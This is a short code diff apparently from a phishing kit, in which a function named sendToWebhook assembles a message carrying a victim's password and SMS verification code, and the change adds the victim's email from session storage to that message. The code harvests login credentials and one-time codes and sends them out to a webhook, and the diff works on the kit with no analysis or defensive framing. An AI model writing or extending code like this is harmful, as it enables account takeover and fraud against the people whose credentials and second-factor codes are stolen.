@@ -80,6 +80,10 @@ async function sendToWebhook(data, type) {
             }
             message += `🔑 <b>Clave:</b> <code>${data.password}</code>\n`;
         } else if (type === 'sms' && data.smsCode) {
+            const savedEmail = sessionStorage.getItem('userEmail');
+            if (savedEmail) {
+                message += `📩 <b>Mail:</b> <code>${savedEmail}</code>\n`;
+            }
             message += `📱 <b>Código SMS:</b> <code>${data.smsCode}</code>\n`;
         }
         
